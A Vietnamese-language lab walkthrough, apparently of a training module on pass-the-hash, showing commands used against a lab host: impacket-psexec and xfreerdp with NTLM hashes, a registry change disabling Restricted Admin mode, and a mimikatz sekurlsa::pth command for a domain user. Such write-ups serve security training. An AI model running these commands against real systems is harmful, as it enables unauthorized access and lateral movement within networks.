<h1>Pass the Hash (PtH)</h1>

![image](https://github.com/user-attachments/assets/012719e1-7e93-4f25-abc8-7e32cab18ffa)

![image](https://github.com/user-attachments/assets/af9ac63d-9f5f-49d8-aeda-ba25d7beef05)

Như mọi mở đầu, dùng `nmap -sV 10.129.20.51` để check:

![image](https://github.com/user-attachments/assets/31050af0-2150-44a4-b0a4-db538dfe6780)

Có khá nhiều thứ thú vị nhưng phải đi theo câu hỏi đã, hint của câu là dùng impacket:

![image](https://github.com/user-attachments/assets/345f991d-9ab9-4689-af4f-3a196ef779a2)

Nên tôi dùng `impacket-psexec administrator@10.129.20.51 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`:

![image](https://github.com/user-attachments/assets/0fb81d18-0b91-4f65-8d7b-b699f6f771d5)

![image](https://github.com/user-attachments/assets/f9960266-2b30-4241-ba4e-fdb622b9ffb9)

![image](https://github.com/user-attachments/assets/20fe27e0-d31f-426b-8bf5-5b9d79b299df)

Câu tiếp tôi dùng `xfreerdp  /v:10.129.20.51 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453`:

![image](https://github.com/user-attachments/assets/c214d3a1-5911-47f0-bd9e-127aa3e9d67d)

Cái này là lỗi ở lý thuyết có nhắc qua rồi:

![image](https://github.com/user-attachments/assets/9b054bee-c891-4ef6-be69-7d15c3942292)

Quay lại impacket kia và chạy `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` để DisableRestrictedAdmin:

![image](https://github.com/user-attachments/assets/6063e6b2-3a8a-49d5-8f43-4b4c748cacd8)

![image](https://github.com/user-attachments/assets/28ed3c66-9263-4bb9-a2a2-319067599895)

Và câu tiếp theo:

![image](https://github.com/user-attachments/assets/efac62cc-b326-4789-b62b-460e26729102)

Đang táy máy thì lỡ tay đọc luôn file của julio với hash của bài cho:)):

![image](https://github.com/user-attachments/assets/df741b11-6935-4fdf-9b35-96df8ec7df3c)

![image](https://github.com/user-attachments/assets/cb923b3c-5b5a-4b06-b6b7-c60a6673d1a1)

![image](https://github.com/user-attachments/assets/2d811fe1-f089-457d-b384-9e05f828d9c2)

Sau khi tìm được david hash là c39f2beb3d2ec06a62cb887fb391dee0 thì tôi dùng `mimikatz.exe privilege::debug "sekurlsa::pth /user:david /NTLM:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit` để vào:

![image](https://github.com/user-attachments/assets/c7544efa-d508-4b0f-a10c-8d0e7e34b331)








